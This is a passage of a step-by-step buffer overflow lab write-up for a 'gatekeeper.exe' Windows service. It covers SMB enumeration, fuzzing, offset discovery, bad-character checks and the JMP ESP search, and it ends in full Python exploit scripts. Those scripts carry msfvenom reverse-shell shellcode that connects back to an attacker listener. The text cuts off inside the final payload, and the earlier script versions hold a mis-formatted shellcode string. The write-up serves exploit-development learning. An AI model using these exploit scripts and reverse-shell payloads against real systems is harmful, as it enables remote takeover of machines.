

---

### Deploy Machine and Scan Network

- ![image](https://user-images.githubusercontent.com/94720207/169636811-a9a34ab5-9d7f-42ec-a883-627f1ad94948.png))

- ![image](https://user-images.githubusercontent.com/94720207/169636037-e216bbad-391c-496c-b461-0e2d65dc1b94.png)

- ![image](https://user-images.githubusercontent.com/94720207/169636850-2f3d5382-d440-4761-9dc2-d9acc64dc4d2.png)

- ![image](https://user-images.githubusercontent.com/94720207/169636867-93df1b45-60a1-45d5-85ce-7dd9eb2aac5c.png)


---

### Services Enumeration

- `smbclient -N -L \\\\$ip_target\\`

- ![image](https://user-images.githubusercontent.com/94720207/169636978-f9fc5e1c-08a2-4e13-a051-7b259bcf8ff4.png)

    - **"Users" share is available for login without password, let's sniff inside.**

- `smbclient -N -L \\\\$ip_target\\Users`

    - I've found the executable `gatekeeper.exe` I will download it and prepare the `Buffer Overflow Lab` in my own bare metal Windows 10. 

- ![image](https://user-images.githubusercontent.com/94720207/169637348-142c6a3f-de24-4c58-8bee-b1c7c6046552.png)

---

### Mona Configuration

- The mona script has been preinstalled, however to make it easier to work with, you should configure a working folder using the following command, which you can run in the command input box at the bottom of the Immunity Debugger window:

    - `!mona config -set workingfolder c:\mona\%p`
    
    - ![image](https://user-images.githubusercontent.com/94720207/169673777-cf70c41e-5ce9-445f-885a-77515903a49b.png)
 
---

### Launching gatekeeper.exe

- Launch as admin `gatekeeper.exe` server:

   - ![image](https://user-images.githubusercontent.com/94720207/169685198-48829607-a781-45da-8271-456b697e2262.png)

- Testing connection from a `netcat` - `nc -nv 192.168.1.100 31337` :

    - ![image](https://user-images.githubusercontent.com/94720207/169685595-e1591e28-1289-4c0e-b907-9701a7bf3ba9.png)

- Attach `gatekeeper.exe` to `Immunity Debugger`

    - ![image](https://user-images.githubusercontent.com/94720207/169685344-36efbd2d-0f4a-47ae-a94e-6f1d50a32fdb.png)
  
- Lock and Loaded!

---

### 1. Fuzzing

- First of all, I will run `gatekeeper.exe` as administrator and then start `Immunity Debugger` and attach the program. 
    
    - ![image](https://user-images.githubusercontent.com/94720207/169637970-252158e3-9967-41e1-a6ac-587a548bde3f.png)

    - ![image](https://user-images.githubusercontent.com/94720207/169637996-c25fa35e-bcd9-4026-b12b-110bc8870e04.png)

- Then, I will run the Immunity Debugger with "play".

    - ![image](https://user-images.githubusercontent.com/94720207/169638036-2ab7bd99-0fea-484a-af2f-7c2e09a96df6.png)

        - Running and ready to go!

- On Kali Linux:

    1. Connect to `gatekeeper.exe`:
        
        - Using the IP Address of the Windows Machine **192.168.10.100** + gatekeeper.exe Port **31337** (We've seen that port on `nmap` typing "help, help, help")
            
        - ![image](https://user-images.githubusercontent.com/94720207/169188519-02fab4e5-91e4-4272-a788-9239ad878c4a.png)
           
        - On Kali: `nc -nv 192.168.1.100 31337`
            
        - ![image](https://user-images.githubusercontent.com/94720207/169638159-af1130de-075d-47b0-b6ab-a43b1ca45838.png)
 
 - **It looks that this program `Gatekeeper` take commands based on what you type AKA `strings` to generate an `answer` with the instruction `Hello ("%variable%")!!!`**
  
     - This means, maybe the buffer overflow and/or the pointer of `EIP` that we need to exploit is located there, maybe I need to send 100 bytes of characters, maybe 3000...who knows!?
     
     - So, **we will do our `fuzzing` process to know how many bytes (characters) do we need to crash the program `gatekeeper.exe`**
     
- **As difference with `Vuln Server` Lab, here we are NOT using commands, just a string to make the `gatekeeper server` respond with a `string`**

    - **So, instead of using **`generic_send_tcp`** technique and spiking the strings, I will write a simple python script doing the following large strings and "jump" the spiking process, I really don't care very much being so precise with the breaking point at this moment, so I will only spam thousands of bytes and see what happen.**
    
```python
#!/usr/bin/python

    # Command: python3 -c 'print ("A" * 5000)'

print ('A' * 5000)
```

- Or just using a python command:

    - `python3 -c 'print ("A" * 5000)'` 

- With this simple script we will generate 5000 bytes of "A's" at once:

    - ![image](https://user-images.githubusercontent.com/94720207/169703432-c792cfff-9b98-4475-bd8f-9332af2a3c63.png)

- And we will copy and paste it to the program, it's just like a basic "manual fuzzing" and then press `enter`:

    - ![image](https://user-images.githubusercontent.com/94720207/169638479-071a4226-18aa-4c60-8247-eeef445f0750.png)

- BOOM!!! We did it!!! The `chatserver.exe` have just crashed, it means the `buffer space` of "message" is not sanitized and we can exploit it. 

    - ![image](https://user-images.githubusercontent.com/94720207/169638574-63ddd521-886b-4327-a82b-c0bfdff6feb1.png)

- Bota fixa papai!

    - If we look at `EBP` we can see `41414141`: THAT'S THE HEX CODE FOR: `AAAA`
    
        - ![image](https://user-images.githubusercontent.com/94720207/169456928-65563691-936f-441c-9ade-edf2f7c31752.png) 

    - Also, we went over `ESP` with a bunch of "A"

    - Finally, we get into `EIP` too with `41414141`: THA'TS THE HEX CODE FOR: `AAAA`

- Remember: **The `EIP` is the important factor!**

    - If we control `EIP` we can point somethin malicious! But for that, we need to locate "where's `EIP` now?"

- NOTE: The program has crashed, so we will need to restart the `Gatekeeper Server` and attach it again to the `Immunity Debugger`

    - **It's better to close everything and start from 0 to avoid errors** 

- We already know that the program `Gatekeeper Server` can crash somewhere if we send a string overflow of 5000 bytes (A's)

- **As difference with `vuln server` we did this process a lot quickier, that's because in this scenario we did not needed `spiking` adn threw random 5000 bytes at once, maybe not so much precise as `spiking` but it's fasterr.**

    - **With just a bunch of "A's" we did realize that the string can crash the program, that means now we need to `find the offset`
    
- we just need to know aprox where we crashed the program, and we know is somewhere around **less than 5000 bytes**

    - Now, that we know that the crash is somewhere less 5000 bytes, we need to know: **where's the `EIP` value at?**

    - Remember, controlling the `EIP` is the puprose of all of this attack. 

### Results

1. **Crashing with `5000` bytes flooding at once**

    - NOTE: Restart `Immunity Debugger` + `gatekeeper.exe` (`CTRL + F12`)

---  

### 2. Finding the Offset

- First of all, restart everything because the last crash...

- We are going to be looking for where the overwirte the `EIP`: 

    - Because controlling EIP means control the shellcode of the program (so we can send malicious scripts like a reverse shell).
    
- **For this step, we will use the tool `pattern_create` by Metasploit:**

    - In Kali machine (-l is for lenght):
    
        - `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000`
    
    - ![image](https://user-images.githubusercontent.com/94720207/169657801-7163e03f-ad5e-4de0-accc-f963221b781b.png)
 
        - Now, instead of sending a bunch of `A`'s we will send the "crazy code", or better said, the pattern algorythm to find the offset.
        
            - **Note: Again, the difference with `vuln server` is that we don't need a string before or `Suffix`, just copy and paste the pattern just like we did with the A's**
            
        - ![image](https://user-images.githubusercontent.com/94720207/169657959-c9040268-2d11-4088-9bcb-1c85ae828abe.png)
        
            - We crashed the `gatekeeper.exe` again, this time with the pattern:
            
        - ![image](https://user-images.githubusercontent.com/94720207/169658066-3761e84e-fbe0-4f81-90e5-1e258f7cf214.png)
 
 - When we send that crazy string we going to get the value on the `EIP` like magic, but how it works?

    1. We send the "crazy code" and we know that in some point it will crash (because it have 5000 bytes and we know it crashes at some point).
    
        - **That "crazy code" is actually a pattern alogythm of characters, so Metasploit can identify the bytes where the crash exactly happened! booom!!!**
    
    3. After the crash, we going to say to Metasppoit:
    
        - **The program have crashed with the `pattern_create`, identify exactly where it crashed, plz! :3.**    

    - Just like in fuzzing: We sent _"TRUN /.:/ Cr4zyCodeCr4zyCodeCodeCr4zyCode..."_ (instead of A's) and matched "the perfect world"
    - We also overwrite `ESP`, `EBP` and `EIP`.
    - It's very similar to the A's, **but in this case we used the Metasploit character `pattern_creator` AKA "the crazy code"**
    
        - NOTE: We can know that we passed by far the crash zone (just like with A's) because we can see a large string on ESP-
        - Remember!: 
        
            1. The perfect world is the large string in `EAX`
            2. Any other large string means that we overwrite that register (`ESP`) by a looooot of chars 
            3. But, the important thing here is that we overwrite `EIP`
        
                - ![image](https://user-images.githubusercontent.com/94720207/169658161-98e52e8c-8083-49af-98da-ba77092e8d56.png)
       
            - **The important and critic value here then is the `EIP`:**
            
                - **`39654138`** 
                            
            - Let's use this value to abuse the vulnerability!

- This step is similar to the last one, but instead of using `pattern_create` tool, we will use `pattern_offset`:

- ![image](https://user-images.githubusercontent.com/94720207/169327203-1bd951d1-a149-4e20-ba65-cecb5cad7020.png)

    - In Kali machine (-l is for lenght), (-q is for query, our finding of the exact **pattern**):
    
        - `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 50000 -q 39654138`
   
    - After we press "enter", we should find a **pattern offset**:
    
        - ![image](https://user-images.githubusercontent.com/94720207/169658272-bd4dbdcc-d60d-432d-a619-5aa86f752195.png)
        
            - **NOTE: We have 3 different exact matches this time (in vuln server or brainstorm there was only 1 at more than `2000` bytes), this is because the real offset is very close to the beginning `146` bytes, this means that 5000 bytes for fuzzing were too much! I needed just 200 to test maybe...**
            
            - **That's why spiking is used!!! With spiking before fuzzing I would know that the offset would be near from 200 maybe, but I've decided to trhow randomly 5000 chars at once. 
            
            - That's why I used 5000 bytes again in this lab, so spiking is now clear! :D**  
        
            - **This information is critical, because this means that exactly at `146 bytes`, we can control `EIP` overwriting it**

### Results

1. **Crashing with `5000` bytes flooding at once**

2. **Crashing with an exact offset of `146` bytes**

    - NOTE: Restart `Immunity Debugger` + `gatekeeper.exe` (`CTRL + F12`)

---

### 3. Controlling EIP

1. Create a new python script called `overflow_gatekeeper_controllingEIP.py` script and set the `offset` variable to the value showed by `mona` `EIP offset` **(was previously set to 0)**.
  
    - Offset: `146` bytes 

2. Set the `payload` variable to an **empty string**. 

3. Set the `retn` variable to `BBBB`.

    - The `EIP` register should now be overwritten with the 4 B's **(BBBB)** `42424242`. 

- **Note: Executing the next script is not necessary for the exploit, so, from here you can only make the script and save it for the next step**

- Create:

    - `overflow_gatekeeper_controllingEIP.py` (chmod +x)

```python
import socket

ip = "192.168.1.100"
port = 31337

prefix = ""
offset = 146
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```
- ![image](https://user-images.githubusercontent.com/94720207/169703776-31ae3bba-3102-4c62-9d05-89c594ec9eeb.png)

    - **Execute it:**

        - **`python3 overflow1_step3_controllingEIP.py`**
    
    - ![image](https://user-images.githubusercontent.com/94720207/169703821-6b445a04-2d58-443b-ac0d-0f75d66db579.png)
        
    - ![image](https://user-images.githubusercontent.com/94720207/169703863-9ec7cd5c-b6e5-4439-a5ba-6efe93aa274c.png)

- The EIP register should now be overwritten with the 4 B's (e.g. 42424242).

### Results

1. **Crashing with `5000` bytes flooding at once**

2. **Crashing with an exact offset of `146` bytes**

3. **Controlling EIP adding `BBBB` / `42424242` at offset `146` +1+2+3+4 bytes**

    - NOTE: Restart `Immunity Debugger` + `gatekeeper.exe` (`CTRL + F12`)

---

### 4. Finding Bad Characters

- Generate a `bytearray` using `mona`, and **exclude the null byte `\x00` by default.** 

- Note the location of the `bytearray.bin` file that is generated (if the working folder was set per the Mona Configuration section of this guide, then the location should be `C:\mona\oscp\bytearray.bin`).

    - `!mona bytearray -b "\x00"`
    
    - ![image](https://user-images.githubusercontent.com/94720207/169704314-ca5db20a-8f20-4e71-9147-019d27b2712e.png)
    
- Now, generate a string of bad chars from \x01 to \xff**:

- Now, generate a string of bad chars from \x01 to \xff**:

```python
# Byte Array (badchars) creator

for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

- Now, generate a **string of bad chars** that is **identical to the bytearray** (or just use the next I made:). 

- ![image](https://user-images.githubusercontent.com/94720207/169704736-97989534-ba56-40d8-9794-7771c98cb418.png)
 
```
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

- Create `overflow_gatekeeper_find_badchars.py` script and set the `payload` variable **to the string of bad chars the script generates.**

```python
import socket

ip = "192.168.1.100"
port = 31337

prefix = ""
offset = 146
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```    

- ![image](https://user-images.githubusercontent.com/94720207/169704833-feaa56fd-938f-4919-89dc-1db656a4b913.png)

- Step by step:

    - Execute first time script:
        
        - **`python3 overflow_gatekeeper_find_badchars.py`**

1. Run the python script for first time with all the badchars from \x01 to \xFF:

    - ![image](https://user-images.githubusercontent.com/94720207/169704921-f00766c9-4181-4f66-8d82-f93bd1fe0a0c.png)
        
    - ![image](https://user-images.githubusercontent.com/94720207/169704965-7fc65885-85be-4e81-a262-124a942f3863.png)
 
2. **Make a note of the address to which the `ESP` register points:

    - **ESP points: `007619E4`**
    
        - **In this lab is easier to find the badchar only by sight, no need of mona module**
        
        - **First, I only saw default \x00 but is also missing \x0a** 
        
            - ![image](https://user-images.githubusercontent.com/94720207/169705105-708803aa-66db-42dc-bf39-29e18605d93c.png)
            
            - ![image](https://user-images.githubusercontent.com/94720207/169707089-c804d0f5-3114-4dd3-819e-a3caeea68e6f.png)
       
3. Then update the `payload` variable in your `overflow_gatekeeper_find_badchars.py` script and remove the **new badchars** `"\x00\x0a"`.

    - ![image](https://user-images.githubusercontent.com/94720207/169707232-2358b69a-7b92-4b7b-8975-f9acda3c5ece.png)

```python
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```
 
### Results

1. **Crashing with `5000` bytes flooding at once**

2. **Crashing with an exact offset of `146` bytes**

3. **Controlling EIP adding `BBBB` / `42424242` at offset `146` +1+2+3+4 bytes**

4. **Badchars found: `\x00\x0a`**

    - NOTE: Restart `Immunity Debugger` + `gatekeeper.exe` (`CTRL + F12`)

---

### 4. Finding a Jump Point

- With the `gatekeeper.exe` either **running or in a crashed state**, run the following `mona` command...

    - **Making sure to update the `-cpb` option with all the `badchars` you identified (including `\x00`)**:

        - `!mona jmp -r esp -cpb "\x00\x0A"`

    - This command finds all `JMP ESP` (or equivalent) instructions with addresses that don't contain any of the badchars specified. 
    
    - ![image](https://user-images.githubusercontent.com/94720207/169707638-078616e6-e895-45e5-9147-fe5e7583dda5.png)
    
    - Other option with the same result is using the command:
    
        - `!mona jmp -r esp -m gatekeeper.exe`  
     
    - ![image](https://user-images.githubusercontent.com/94720207/169707718-26599070-60be-4358-8bf1-fcf20cf9b601.png)

    - The results should display in the `Log data` window (use the Window menu to switch to it if needed).

    - Choose an address and update your python script with the new `overflow1_step4_findJumpPoint.py` script.
    
        - 1st Address/Pointer: `080414C3` 
    
        - Set the `retn` variable to the address, written `"special backwards"` (since the system is `little endian`). 
        
            - **For example:**
            
                - If the address is `\x01\x02\x03\x04` 
                
                - in Immunity, write it as `\x04\x03\x02\x01` in your exploit.
            
            - **Reversing `little indian`:**
            
                - Normal: `080414C3`
                
                - Separate Normal: `08 04 14 C3`
                
                - Reversed pair: `C3 14 04 08`
                
                - Final Result: `"\xC3\x14\x04\x08"` 
            
            - **`retn` = `"\xC3\x14\x04\x08"`**     

- Create file: `overflow1_step4_findJumpPoint.py`

```python
import socket

ip = "192.168.1.100"
port = 31337

prefix = ""
offset = 146
overflow = "A" * offset
retn = "\xC3\x14\x04\x08"
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

- ![image](https://user-images.githubusercontent.com/94720207/169707924-f8e313b0-f269-42c2-959f-95daa555b5cc.png)

### Results

1. **Crashing with `5000` bytes flooding at once**

2. **Crashing with an exact offset of `146` bytes**

3. **Controlling EIP adding `BBBB` / `42424242` at offset `146` +1+2+3+4 bytes**

4. **Badchars found: `\x00\x0A`**

5. **Found jump point `JPM ESP` = 080414C3 to little indian = `retn=\xC3\x14\x04\x08` ** 

    - NOTE: Restart `Immunity Debugger` + `gatekeeper.exe` (`CTRL + F12`)

---

### 5. Generate the final Payload

- Run the following `msfvenom` command on Kali, using your Kali `VPN IP` as the `LHOST` and updating the `-b` option with all the badchars you identified (including `\x00`):

    - `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.66 LPORT=4444 EXITFUNC=thread -b "\x00\x0A" -f c`
    
    - ![image](https://user-images.githubusercontent.com/94720207/169708167-174b23c6-09f2-423a-a713-8d16a0003608.png)
 
- Copy the generated `C code strings` and integrate them into a new modifies python script called `overflow_gatekeeper_step567_Final_Payload.py` script `payload` variable

    - Create: `overflow_gatekeeper_step567_Final_Payload.py`:

```python
import socket

ip = "192.168.1.100"
port = 31337

prefix = ""
offset = 146
overflow = "A" * offset
retn = "\xC3\x14\x04\x08"
padding = ""
payload = "\xba\x1c\xf2\x98\x43\xda\xc5\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x52\x31\x56\x12\x03\x56\x12\x83\xda\xf6\x7a\xb6\x1e\x1e\xf8"
"\x39\xde\xdf\x9d\xb0\x3b\xee\x9d\xa7\x48\x41\x2e\xa3\x1c\x6e"
"\xc5\xe1\xb4\xe5\xab\x2d\xbb\x4e\x01\x08\xf2\x4f\x3a\x68\x95"
"\xd3\x41\xbd\x75\xed\x89\xb0\x74\x2a\xf7\x39\x24\xe3\x73\xef"
"\xd8\x80\xce\x2c\x53\xda\xdf\x34\x80\xab\xde\x15\x17\xa7\xb8"
"\xb5\x96\x64\xb1\xff\x80\x69\xfc\xb6\x3b\x59\x8a\x48\xed\x93"
"\x73\xe6\xd0\x1b\x86\xf6\x15\x9b\x79\x8d\x6f\xdf\x04\x96\xb4"
"\x9d\xd2\x13\x2e\x05\x90\x84\x8a\xb7\x75\x52\x59\xbb\x32\x10"
"\x05\xd8\xc5\xf5\x3e\xe4\x4e\xf8\x90\x6c\x14\xdf\x34\x34\xce"
"\x7e\x6d\x90\xa1\x7f\x6d\x7b\x1d\xda\xe6\x96\x4a\x57\xa5\xfe"
"\xbf\x5a\x55\xff\xd7\xed\x26\xcd\x78\x46\xa0\x7d\xf0\x40\x37"
"\x81\x2b\x34\xa7\x7c\xd4\x45\xee\xba\x80\x15\x98\x6b\xa9\xfd"
"\x58\x93\x7c\x51\x08\x3b\x2f\x12\xf8\xfb\x9f\xfa\x12\xf4\xc0"
"\x1b\x1d\xde\x68\xb1\xe4\x89\x56\xee\xe7\x0b\x3f\xed\xe7\x9a"
"\xe3\x78\x01\xf6\x0b\x2d\x9a\x6f\xb5\x74\x50\x11\x3a\xa3\x1d"
"\x11\xb0\x40\xe2\xdc\x31\x2c\xf0\x89\xb1\x7b\xaa\x1c\xcd\x51"
"\xc2\xc3\x5c\x3e\x12\x8d\x7c\xe9\x45\xda\xb3\xe0\x03\xf6\xea"
"\x5a\x31\x0b\x6a\xa4\xf1\xd0\x4f\x2b\xf8\x95\xf4\x0f\xea\x63"
"\xf4\x0b\x5e\x3c\xa3\xc5\x08\xfa\x1d\xa4\xe2\x54\xf1\x6e\x62"
"\x20\x39\xb1\xf4\x2d\x14\x47\x18\x9f\xc1\x1e\x27\x10\x86\x96"
"\x50\x4c\x36\x58\x8b\xd4\x56\xbb\x19\x21\xff\x62\xc8\x88\x62"
"\x95\x27\xce\x9a\x16\xcd\xaf\x58\x06\xa4\xaa\x25\x80\x55\xc7"
"\x36\x65\x59\x74\x36\xac"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

--- 

### Prepend NOPs / Padding

- Since an **encoder was likely used to generate the payload**, you will need some **space in memory for the payload to unpack itself**. 

    - **You can do this by setting the `padding` variable to a string of `16 or more` `"No Operation"` (`\x90`) bytes:

        - `padding = "\x90" * 16`
        
- Add this to the `overflow_gatekeeper_step567_Final_Payload.py` script:

```python
import socket

ip = "192.168.1.100"
port = 31337

prefix = ""
offset = 146
overflow = "A" * offset
retn = "\xC3\x14\x04\x08"
padding = "\x90" * 16
payload = "\xba\x1c\xf2\x98\x43\xda\xc5\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x52\x31\x56\x12\x03\x56\x12\x83\xda\xf6\x7a\xb6\x1e\x1e\xf8"
"\x39\xde\xdf\x9d\xb0\x3b\xee\x9d\xa7\x48\x41\x2e\xa3\x1c\x6e"
"\xc5\xe1\xb4\xe5\xab\x2d\xbb\x4e\x01\x08\xf2\x4f\x3a\x68\x95"
"\xd3\x41\xbd\x75\xed\x89\xb0\x74\x2a\xf7\x39\x24\xe3\x73\xef"
"\xd8\x80\xce\x2c\x53\xda\xdf\x34\x80\xab\xde\x15\x17\xa7\xb8"
"\xb5\x96\x64\xb1\xff\x80\x69\xfc\xb6\x3b\x59\x8a\x48\xed\x93"
"\x73\xe6\xd0\x1b\x86\xf6\x15\x9b\x79\x8d\x6f\xdf\x04\x96\xb4"
"\x9d\xd2\x13\x2e\x05\x90\x84\x8a\xb7\x75\x52\x59\xbb\x32\x10"
"\x05\xd8\xc5\xf5\x3e\xe4\x4e\xf8\x90\x6c\x14\xdf\x34\x34\xce"
"\x7e\x6d\x90\xa1\x7f\x6d\x7b\x1d\xda\xe6\x96\x4a\x57\xa5\xfe"
"\xbf\x5a\x55\xff\xd7\xed\x26\xcd\x78\x46\xa0\x7d\xf0\x40\x37"
"\x81\x2b\x34\xa7\x7c\xd4\x45\xee\xba\x80\x15\x98\x6b\xa9\xfd"
"\x58\x93\x7c\x51\x08\x3b\x2f\x12\xf8\xfb\x9f\xfa\x12\xf4\xc0"
"\x1b\x1d\xde\x68\xb1\xe4\x89\x56\xee\xe7\x0b\x3f\xed\xe7\x9a"
"\xe3\x78\x01\xf6\x0b\x2d\x9a\x6f\xb5\x74\x50\x11\x3a\xa3\x1d"
"\x11\xb0\x40\xe2\xdc\x31\x2c\xf0\x89\xb1\x7b\xaa\x1c\xcd\x51"
"\xc2\xc3\x5c\x3e\x12\x8d\x7c\xe9\x45\xda\xb3\xe0\x03\xf6\xea"
"\x5a\x31\x0b\x6a\xa4\xf1\xd0\x4f\x2b\xf8\x95\xf4\x0f\xea\x63"
"\xf4\x0b\x5e\x3c\xa3\xc5\x08\xfa\x1d\xa4\xe2\x54\xf1\x6e\x62"
"\x20\x39\xb1\xf4\x2d\x14\x47\x18\x9f\xc1\x1e\x27\x10\x86\x96"
"\x50\x4c\x36\x58\x8b\xd4\x56\xbb\x19\x21\xff\x62\xc8\x88\x62"
"\x95\x27\xce\x9a\x16\xcd\xaf\x58\x06\xa4\xaa\x25\x80\x55\xc7"
"\x36\x65\x59\x74\x36\xac"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

---

### Exploit!!! Que chille!

- Checklist for correct variables: 

    1. prefix (_not needed in Gatekeeper Lab_)
    2. offset
    3. return address (retn)
    4. padding
    5. payload set

- **Final Payload Script = `overflow_gatekeeper_step567_Final_Payload.py`**

```python
import socket

ip = "192.168.1.100"
port = 31337

prefix = ""
offset = 146
overflow = "A" * offset
retn = "\xC3\x14\x04\x08"
padding = "\x90" * 16
payload = ("\xba\x1c\xf2\x98\x43\xda\xc5\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x52\x31\x56\x12\x03\x56\x12\x83\xda\xf6\x7a\xb6\x1e\x1e\xf8"
"\x39\xde\xdf\x9d\xb0\x3b\xee\x9d\xa7\x48\x41\x2e\xa3\x1c\x6e"
"\xc5\xe1\xb4\xe5\xab\x2d\xbb\x4e\x01\x08\xf2\x4f\x3a\x68\x95"
"\xd3\x41\xbd\x75\xed\x89\xb0\x74\x2a\xf7\x39\x24\xe3\x73\xef"
"\xd8\x80\xce\x2c\x53\xda\xdf\x34\x80\xab\xde\x15\x17\xa7\xb8"
"\xb5\x96\x64\xb1\xff\x80\x69\xfc\xb6\x3b\x59\x8a\x48\xed\x93"
"\x73\xe6\xd0\x1b\x86\xf6\x15\x9b\x79\x8d\x6f\xdf\x04\x96\xb4"
"\x9d\xd2\x13\x2e\x05\x90\x84\x8a\xb7\x75\x52\x59\xbb\x32\x10"
